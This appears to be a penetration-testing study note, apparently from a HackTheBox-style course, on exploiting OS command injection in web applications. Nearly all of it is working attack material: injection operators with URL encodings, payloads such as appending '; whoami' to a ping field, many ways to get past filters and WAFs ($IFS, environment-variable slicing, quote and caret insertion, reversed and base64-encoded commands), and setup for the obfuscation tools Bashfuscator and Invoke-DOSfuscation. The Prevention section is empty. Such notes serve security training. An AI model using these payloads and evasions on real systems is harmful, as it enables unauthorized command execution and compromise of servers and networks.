A Command Injection vulnerability allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network.

## Exploitation

#### Detection
Any utilities that appear to execute commands, we can attempt to append additional commands using the following operators.

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | \|                      | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | \|\|                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ``                      | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
#### Injecting Commands
Assume we have a field on a web page that executes a ping command, and it asks us to specify an IP address. When we supply it an IP, it provides the ping output. We can append the IP with another command.

Examples
```bash
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 || whoami    # only if first fails
```

Bypassing Front-End Validation -- # Modify request directly
```bash
# Open POST Request in Burp
# Modify field and send
ip=127.0.0.1%3b+whoami
```

Common Operators

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

## Filter Evasion
#### Identifying Filters
Sometimes including operators might result in errors due to filters or WAF in place. You can test to see which ones result in errors by isolating 1 character at a time.
#### Bypassing Space Filters and Injection Filters
```bash
# example: ip=127.0.0.1; whoami

# Using \n to replace ;
Replace ; with \n (%0a)               # ip=127.0.0.1%0a
also consider ${LS_COLORS:10:1}       # ip=127.0.0.1${LS_COLORS:10:1}

# Using tabs to replace spaces
Follow with tab or (%09)              # ip=127.0.0.1%0a%09

# Using $IFS (Linux Environment Variable) -- default value is space and tab
Follow spaces with ${IFS}             # ip=127.0.0.1%0a${IFS}

# Using Brace Expansion
Substitute IFS with commands          # ip=127.0.0.1%0a${ls,-la}
```
See [PayloadsAllTheThings bypass section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) on stuff we can do with IFS

#### Bypassing Other Backlisted Characters
A very commonly blacklisted character is the slash (`/`) or backslash (`\`) character

Linux
```bash
# Bypassing blacklisted /
${PATH:0:1}    # this works by outputing the first character of the PATH var

# Bypassing blacklisted ;
${LS_COLORS:10:1}

# Example of command substitution with these
ip=${LS_COLORS:10:1}${IFS}
```

Windows
```bash
# Bypassing blacklisted \ (cmd)
%HOMEPATH:~6,-11%    # outputs \Users\<user>. 6 is starting position, -11 is negative length of username (so htb-student = -11)

# Bypassing blacklisted \ (powershell)
$env:HOMEPATH[0]
```

Character Shifting
```bash
# Find character in ascii table and identify its place
man ascii               # ie: \ is 92, [ is 91

# Shift characters by using 1 character before the one you want
$(tr '!-}' '"-~'<<<[)    # becomes \ because [ is 91 and \ is 92]
```

#### Bypassing Blacklisted Commands
We have discussed various methods for bypassing single-character filters. However, there are different methods when it comes to bypassing blacklisted commands.

```bash
# Inserting quotes within our command
w'h'o'am'i       # ip=127.0.0.1%0aw'h'o'am'i 
w"h"o"am"i       # ip=127.0.0.1%0aw"h"o"am"i

# Linux Only -- Inserting \ and positional paramater $@
who$@ami
w\ho\am\i

# Windows Only -- Inserting caret ^
who^ami

# Case Manipulation
WhOaMi                               # Windows
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")     # Linux
$(a="WhOaMi";printf %s "${a,,}")     # Linux

# Reversed Commands
echo '<command>' | rev        # Reverse string with bash
$(rev<<<'<reversed_command>')           # Linux

"<command>"[-1..-20] -join ''  # Reverse string with powershell
$('<reversed_command>'[-1..-20] -join '')   # Windows

# Encoded Commands
echo -n '<command>' | base64  # base64 encode command from bash
bash<<<$(base64 -d<<<base_64_string)   # ip=127.0.0.1%0abash<<<$(base64 -d<<<base_64_string) 

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('cmd')) #windows

```

#### Evasion Tools
If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools

Linux -- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
```bash
# Setup
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usage
cd ./bashfuscator/bin/
./bashfuscator -h     # help menu

# Obfuscate commands
./bashfuscator -c '<command>'   # picks a random obfuscation technique
./bashfuscator -c '<command>' -s 1 -t 1 --no-mangling --layers 1  # example

# Test and verify obfuscated commands
bash -c '<obfuscated command>'
```

Windows -- [DOSfucation](https://github.com/danielbohannon/Invoke-DOSfuscation)
```powershell
# Setup and Run
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation   # This tool is interactive

# Commands
tutorial   # tutorial

SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1   # should run obfuscated command
```
## Prevention